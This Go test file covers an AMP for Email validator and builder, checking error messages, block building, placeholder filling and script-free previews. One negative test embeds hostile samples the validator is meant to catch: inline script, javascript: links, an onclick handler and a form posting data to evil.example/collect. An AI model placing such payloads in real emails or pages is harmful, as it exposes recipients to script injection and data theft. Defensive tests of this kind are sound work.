package amp

import (
	"encoding/json"
	"strings"
	"testing"
)

const minimal = `<!doctype html>
<html ⚡4email data-css-strict>
<head>
<meta charset="utf-8">
<script async src="https://cdn.ampproject.org/v0.js"></script>
<style amp4email-boilerplate>body{visibility:hidden}</style>
</head>
<body>
<p>Hello {{contact.first_name | default:"there"}}</p>
</body>
</html>`

func TestValidateMinimal(t *testing.T) {
	if ps := Validate(minimal); len(ps) != 0 {
		t.Fatalf("problems: %v", ps)
	}
	if ps := Validate("  "); ps != nil {
		t.Fatalf("empty: %v", ps)
	}
}

func hasProblem(ps []Problem, line int, sub string) bool {
	for _, p := range ps {
		if p.Line == line && strings.Contains(p.Message, sub) {
			return true
		}
	}
	return false
}

func TestValidateFailuresWithLines(t *testing.T) {
	doc := `<!doctype html>
<html>
<head>
<meta charset="utf-8">
<script async src="https://cdn.ampproject.org/v0.js"></script>
<script>alert(1)</script>
<style amp4email-boilerplate>body{visibility:hidden}</style>
<style amp-custom>p{color:red !important}</style>
<link rel="stylesheet" href="https://x.example/a.css">
</head>
<body>
<img src="https://x.example/a.png">
<amp-img src="http://x.example/a.png"></amp-img>
<a href="javascript:alert(1)">x</a>
<div onclick="go()">y</div>
<form method="post" action-xhr="https://evil.example/collect"><input name="a"></form>
<form method="get" action="https://x.example"></form>
<amp-carousel width="600" height="300" type="slides"><div>a</div></amp-carousel>
<amp-video width="1" height="1"></amp-video>
<input type="file" name="f">
</body>
</html>`
	ps := Validate(doc)
	for _, c := range []struct {
		line int
		sub  string
	}{
		{2, "⚡4email"},
		{6, "custom JavaScript"},
		{8, "!important"},
		{9, "external stylesheets"},
		{12, "amp-img"},
		{13, "width and height"},
		{13, "https"},
		{14, "javascript"},
		{15, "event handler"},
		{16, "post back to Pulse"},
		{17, "action-xhr, not action"},
		{17, `method="post"`},
		{18, "needs its script"},
		{19, "isn't supported"},
		{20, `type="file"`},
	} {
		if !hasProblem(ps, c.line, c.sub) {
			t.Errorf("want line %d %q in %v", c.line, c.sub, ps)
		}
	}
}

func TestValidateMissingBoilerplateAndSize(t *testing.T) {
	ps := Validate("<html ⚡4email><head></head><body>" + strings.Repeat("x", MaxBytes) + "</body></html>")
	for _, sub := range []string{"<!doctype html>", "200 KB", "charset", "runtime", "boilerplate"} {
		found := false
		for _, p := range ps {
			found = found || strings.Contains(p.Message, sub)
		}
		if !found {
			t.Errorf("want %q in %v", sub, ps)
		}
	}
}

func TestValidatePulseForm(t *testing.T) {
	doc := strings.Replace(minimal, "</head>", `<script async custom-element="amp-form" src="https://cdn.ampproject.org/v0/amp-form-0.1.js"></script>
<script async custom-template="amp-mustache" src="https://cdn.ampproject.org/v0/amp-mustache-0.2.js"></script>
</head>`, 1)
	doc = strings.Replace(doc, "</body>", `<form method="post" action-xhr="pulse:submit/poll-1"><input type="radio" name="answer" value="a">
<div submit-success><template type="amp-mustache">{{message}}</template></div></form>
<form method="post" action-xhr="pulse:submit/poll-1"></form>
<form method="post" action-xhr="pulse:submit/Bad Name"></form>
</body>`, 1)
	ps := Errors(Validate(doc))
	if len(ps) != 2 || !hasProblem(ps, 14, "already used on line 12") || !hasProblem(ps, 15, "valid block name") {
		t.Fatalf("problems: %v", ps)
	}
	if got := Blocks(doc); len(got) != 1 || got[0] != "poll-1" {
		t.Errorf("blocks %v", got)
	}
	unused := strings.Replace(minimal, "</head>", `<script async custom-element="amp-carousel" src="https://cdn.ampproject.org/v0/amp-carousel-0.2.js"></script></head>`, 1)
	if ps := Validate(unused); len(ps) != 1 || !ps[0].Warning || len(Errors(ps)) != 0 {
		t.Errorf("unused script: %v", ps)
	}
}

func fullDoc() *Doc {
	return &Doc{Style: Style{Accent: "#ff6600", Font: "serif"}, Blocks: []Block{
		{ID: "h", Type: TypeHeading, Text: `Hi {{contact.first_name | default:"there"}} & co`},
		{ID: "t", Type: TypeText, Text: "Line one\nline two\n\nNew paragraph"},
		{ID: "img", Type: TypeImage, Image: &Image{Src: "https://cdn.example/a.png", Alt: "A", Link: "https://shop.example", Caption: "Cap"}},
		{ID: "b", Type: TypeButton, Text: "Shop", URL: "https://shop.example/?u={{contact.external_id}}"},
		{ID: "car", Type: TypeCarousel, Autoplay: 4, Items: []Image{{Src: "https://cdn.example/1.png"}, {Src: "https://cdn.example/2.png", Link: "https://x.example"}}},
		{ID: "gal", Type: TypeGallery, Items: []Image{{Src: "https://cdn.example/1.png"}, {Src: "https://cdn.example/2.png"}}},
		{ID: "faq", Type: TypeAccordion, Sections: []Section{{Title: "Shipping?", Body: "Free"}, {Title: "Returns?", Body: "30 days"}}},
		{ID: "poll-1", Type: TypePoll, Text: "Which colour?", Options: []string{"Red", "Blue"}, ShowResults: true},
		{ID: "signup", Type: TypeForm, Text: "Tell us", Fields: []FormField{
			{Key: "city", Label: "City", Type: "text", Required: true, SaveTo: "city"},
			{Key: "size", Label: "Size", Type: "select", Options: []string{"S", "M"}},
			{Key: "news", Label: "Newsletter", Type: "checkbox"},
			{Key: "note", Label: "Note", Type: "textarea"},
		}},
	}}
}

func TestBuildOutputValidates(t *testing.T) {
	out, err := fullDoc().Build()
	if err != nil {
		t.Fatal(err)
	}
	if ps := Validate(out); len(ps) != 0 {
		t.Fatalf("builder output has problems: %v\n%s", ps, out)
	}
	for _, want := range []string{`action-xhr="pulse:submit/poll-1"`, `action-xhr="pulse:submit/signup"`, "amp-accordion-0.1.js",
		"amp-carousel-0.2.js", `autoplay delay="4000"`, "&amp; co", "Georgia", "<details>"} {
		if want == "<details>" {
			if !strings.Contains(PreviewHTML(out), want) {
				t.Errorf("preview lacks %s", want)
			}
			continue
		}
		if !strings.Contains(out, want) {
			t.Errorf("output lacks %s", want)
		}
	}
	// Each block type alone builds valid AMP too (only the scripts it needs).
	for _, b := range fullDoc().Blocks {
		d := Doc{Blocks: []Block{b}}
		o, err := d.Build()
		if err != nil {
			t.Fatalf("%s: %v", b.Type, err)
		}
		if ps := Validate(o); len(ps) != 0 {
			t.Errorf("%s alone: %v", b.Type, ps)
		}
	}
}

func TestBuildChecks(t *testing.T) {
	for name, d := range map[string]Doc{
		"empty":       {},
		"dup id":      {Blocks: []Block{{ID: "a", Type: TypeText, Text: "x"}, {ID: "a", Type: TypeText, Text: "y"}}},
		"http image":  {Blocks: []Block{{ID: "a", Type: TypeImage, Image: &Image{Src: "http://x/a.png"}}}},
		"one answer":  {Blocks: []Block{{ID: "a", Type: TypePoll, Text: "Q", Options: []string{"x"}}}},
		"reserved":    {Blocks: []Block{{ID: "a", Type: TypeForm, Fields: []FormField{{Key: "answer", Label: "A", Type: "text"}}}}},
		"bad colour":  {Style: Style{Accent: "red;x"}, Blocks: []Block{{ID: "a", Type: TypeText, Text: "x"}}},
		"js link":     {Blocks: []Block{{ID: "a", Type: TypeButton, Text: "x", URL: "javascript:alert(1)"}}},
		"field type":  {Blocks: []Block{{ID: "a", Type: TypeForm, Fields: []FormField{{Key: "a", Label: "A", Type: "file"}}}}},
		"block name":  {Blocks: []Block{{ID: "A B", Type: TypeText, Text: "x"}}},
		"unknown":     {Blocks: []Block{{ID: "a", Type: "video"}}},
		"one picture": {Blocks: []Block{{ID: "a", Type: TypeCarousel, Items: []Image{{Src: "https://x/a.png"}}}}},
	} {
		if _, err := d.Build(); err == nil {
			t.Errorf("%s: built", name)
		}
	}
	raw, _ := json.Marshal(fullDoc())
	d, err := ParseDoc(raw)
	if err != nil || len(d.SaveTargets()) != 1 {
		t.Fatalf("parse: %v %v", d, err)
	}
	if b, ok := d.Find("poll-1"); !ok || b.Type != TypePoll {
		t.Error("find")
	}
}

func TestProtectAndFill(t *testing.T) {
	out, _ := fullDoc().Build()
	p, restore := Protect(out)
	if strings.Contains(p, "{{message}}") || strings.Contains(p, "{{#items}}") {
		t.Fatal("mustache left in")
	}
	if restore(p) != out {
		t.Fatal("restore")
	}
	filled := Fill(out, func(kind, block string) string {
		return "https://pulse.example/v1/amp/" + kind + "-" + block + "?a=1&b=2"
	})
	if !strings.Contains(filled, `action-xhr="https://pulse.example/v1/amp/submit-poll-1?a=1&amp;b=2"`) || strings.Contains(filled, "pulse:submit") {
		t.Errorf("fill: %s", filled)
	}
}

func TestPreviewIsScriptFree(t *testing.T) {
	out, _ := fullDoc().Build()
	pv := PreviewHTML(out + `<a href="javascript:x">j</a>`)
	for _, bad := range []string{"<script", "visibility:hidden", "<amp-img", "javascript:", "{{message}}", "action-xhr"} {
		if strings.Contains(pv, bad) {
			t.Errorf("preview contains %s", bad)
		}
	}
	for _, want := range []string{`<img src="https://cdn.example/a.png"`, "overflow-x:auto", "<summary", "Which colour?"} {
		if !strings.Contains(pv, want) {
			t.Errorf("preview lacks %s", want)
		}
	}
}
